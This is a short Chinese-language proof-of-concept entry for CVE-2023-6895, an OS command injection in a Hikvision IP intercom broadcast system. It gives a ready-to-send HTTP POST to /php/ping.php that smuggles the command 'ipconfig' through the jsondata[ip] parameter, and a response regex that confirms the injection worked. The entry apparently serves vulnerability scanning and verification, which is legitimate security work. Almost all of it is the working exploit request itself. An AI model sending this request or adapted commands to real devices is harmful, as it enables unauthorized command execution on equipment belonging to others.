﻿# 海康威视IP网络对讲广播系统远程命令执行

> 更新时间：2023-12-18

> 漏洞编号：CVE-2023-6895

> 漏洞说明：海康威视对讲广播系统3.0.3_20201113_RELEASE(HIK)存在漏洞。它已被宣布为关键。该漏洞影响文件/php/ping.php 的未知代码。使用输入 netstat -ano 操作参数 jsondata[ip] 会导致 os 命令注入。影响版本:v3.0.3_20201113_RELEASE(HIK)

> 漏洞特征：

> 验证脚本：HTTP

```
POST /php/ping.php HTTP/1.1
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Connection: close

jsondata[type]=3&jsondata[ip]=ipconfig
```

> 响应代码特征：200

> 响应内容特征：^(?=.*?IP)(?=.*?Address).*?$

> 上传文件定位：


> 验证文件来源：海康威视IP网络对讲广播系统远程命令执行.poc
